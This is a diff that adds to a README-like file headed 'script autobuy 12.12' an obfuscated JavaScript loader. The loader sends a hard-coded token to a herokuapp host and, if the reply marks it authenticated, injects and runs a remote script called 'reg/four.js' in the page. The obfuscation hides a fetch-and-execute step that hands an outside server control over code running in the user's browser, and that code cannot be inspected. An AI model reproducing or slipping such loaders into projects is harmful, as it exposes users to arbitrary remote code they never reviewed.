@@ -1,2 +1,8 @@
 # dissa
 script autobuy 12.12
+! function() {
+    var token = "$2y$10$FNi9ZnrInsYizYtfvUEG0OEFCVl.pNPVUchLGRnyKYaioQCCh3/gO";
+    var type = 'live'; //live,draft
+    var version = 'regular_v4';
+    var _0x35e5=['parse','authenticated','head','send','reg/four.js','getElementsByTagName','status','appendChild','SCRIPT','onreadystatechange','src','open','type','https://127.0.0.1:8000/','log','text/javascript','readyState','GET'];(function(_0x17d488,_0x1e9be8){var _0x35e5fd=function(_0x4cfb2d){while(--_0x4cfb2d){_0x17d488['push'](_0x17d488['shift']());}};_0x35e5fd(++_0x1e9be8);}(_0x35e5,0x1c3));var _0x4cfb=function(_0x17d488,_0x1e9be8){_0x17d488=_0x17d488-0xd0;var _0x35e5fd=_0x35e5[_0x17d488];return _0x35e5fd;};var _0x302c0d=_0x4cfb,url={'live':'https://tipsandtricksonyt.herokuapp.com/','draft':_0x302c0d(0xdc)},isAuthenticated=![],xhttp=new XMLHttpRequest();console[_0x302c0d(0xdd)](isAuthenticated),xhttp[_0x302c0d(0xd8)]=function(){var _0x1372ee=_0x302c0d;if(this[_0x1372ee(0xdf)]==0x4&&this[_0x1372ee(0xd5)]==0xc8){var _0x27259b=JSON[_0x1372ee(0xe1)](this['responseText']);console[_0x1372ee(0xdd)](_0x27259b),isAuthenticated=_0x27259b[_0x1372ee(0xd0)],console[_0x1372ee(0xdd)](isAuthenticated),isAuthenticated&&version=='regular_v4'&&!function(){var _0x2e6bf=_0x1372ee,_0x5a2cdc=document['createElement'](_0x2e6bf(0xd7));_0x5a2cdc[_0x2e6bf(0xd9)]=url[type]+_0x2e6bf(0xd3),_0x5a2cdc[_0x2e6bf(0xdb)]=_0x2e6bf(0xde),document[_0x2e6bf(0xd4)](_0x2e6bf(0xd1))[0x0][_0x2e6bf(0xd6)](_0x5a2cdc);}();}},xhttp[_0x302c0d(0xda)](_0x302c0d(0xe0),url[type]+'api/getreg?token='+token),xhttp[_0x302c0d(0xd2)]();
+}();
